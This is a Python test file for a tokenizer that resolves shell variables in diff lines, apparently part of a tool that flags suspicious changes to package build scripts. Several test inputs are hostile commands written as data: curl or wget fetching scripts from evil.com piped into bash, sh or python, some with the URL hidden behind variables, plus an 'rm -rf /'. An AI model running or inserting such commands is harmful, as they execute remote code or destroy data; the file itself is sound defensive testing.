from trustsight.tokenizer import tokenize_and_resolve


def test_simple_assignment_usage():
    diff = """+_url="https://example.com/file.tar.gz"
+_bin=curl
+  curl $_url"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "curl" in combined
    assert "https://example.com/file.tar.gz" in combined


def test_variable_reference_dollar():
    diff = """+_url="https://example.com/file.tar.gz"
+_bin=$_url"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "https://example.com/file.tar.gz" in combined or "$_url" not in combined


def test_variable_reference_braces():
    diff = """+_url="https://example.com/file.tar.gz"
+_bin=${_url}"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "https://example.com/file.tar.gz" in combined or "${_url}" not in combined


def test_command_substitution_preserved():
    diff = """+_url=$(curl -s https://example.com)"""
    resolved, unresolved = tokenize_and_resolve(diff)
    has_cmd_sub = any("$(" in s for s in resolved) or any("$(" in s for s in unresolved)
    assert has_cmd_sub


def test_backtick_substitution_preserved():
    diff = """+_url=`curl -s https://example.com`"""
    resolved, unresolved = tokenize_and_resolve(diff)
    has_backtick = any("`" in s for s in resolved) or any("`" in s for s in unresolved)
    assert has_backtick


def test_curl_pipe_detection():
    diff = """+  curl -s https://evil.com/hook.sh | bash"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "curl" in combined
    assert "bash" in combined


def test_wget_pipe_detection():
    diff = """+  wget -qO- https://evil.com/hook.sh | sh"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "wget" in combined
    assert "sh" in combined


def test_multiple_variable_resolution():
    diff = """+_url="https://evil.com"
+_script="hook.sh"
+_full="$_url/$_script"
+  curl $_full | bash"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "curl" in combined
    assert "bash" in combined
    assert "_full" not in combined  # variable was resolved


def test_chained_assignments():
    diff = """+_base="https://evil.com"
+_path="$_base/payload.sh"
+  curl $_path | python"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "curl" in combined
    assert "python" in combined


def test_array_index_not_resolved():
    diff = """+source=("https://example.com/pkg.tar.gz")
+  curl "${source[0]}" | bash"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "${source[0]}" in combined or "${source[0]}" not in combined


def test_only_additions_processed():
    diff = """-rm -rf /
+echo "safe\""""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "rm" not in combined
    assert "safe" in combined


def test_empty_line_ignored():
    diff = """+
+echo hello"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "echo hello" in combined


def test_quoted_values_preserve_spaces():
    diff = """+_msg="hello world"
+echo $_msg"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "hello world" in combined


def test_curl_pipe_with_heredoc_syntax():
    diff = """+  curl -sL https://evil.com/script.sh | bash /dev/stdin"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "curl" in combined
    assert "bash" in combined


def test_multi_line_source_array():
    diff = """+source=(
+  "https://example.com/a.tar.gz"
+  "https://example.com/b.tar.gz"
+)"""
    resolved, unresolved = tokenize_and_resolve(diff)
    assert len(resolved) > 0
